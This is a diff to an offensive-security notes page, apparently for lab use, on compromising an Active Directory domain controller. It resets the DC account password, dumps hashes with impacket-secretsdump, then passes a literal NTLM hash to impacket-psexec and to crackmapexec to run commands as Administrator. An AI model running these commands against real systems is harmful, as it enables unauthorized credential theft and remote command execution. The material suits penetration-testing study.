@@ -23,7 +23,7 @@ pip install -r requirements.txt
 
 Running the script should results in Domain Controller's account password being reset to an empty string.
 
-![](<../../.gitbook/assets/image (231).png>)
+![](<../../../.gitbook/assets/image (231).png>)
 
 test to see if the password was reseted:
 
@@ -31,7 +31,7 @@ test to see if the password was reseted:
 impacket-secretsdump  -no-pass -just-dc MEGACORP.local/Lord_of_Domains\$@192.168.56.118
 ```
 
-![](<../../.gitbook/assets/image (232).png>)
+![](<../../../.gitbook/assets/image (232).png>)
 
 ## Using Metasploit
 
@@ -83,8 +83,25 @@ set PASSWORD 4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7b
 run
 ```
 
-## CMD Shell&#x20;
+## PSEXEC
+
+{% hint style="info" %}
+The hash is from `secretsdump` output.
+{% endhint %}
 
 ```
 impacket-psexec -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:812d42b0faa0200aa3361267f518c3c5  domain.local/Administrator@192.168.120.247
 ```
+
+## crackmapexec
+
+{% hint style="info" %}
+The hash is from `secretsdump` output.
+{% endhint %}
+
+```
+crackmapexec smb 192.168.120.247 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:812d42b0faa0200aa3361267f518c3c5  -d domain.local -x whoami
+```
+
+
+
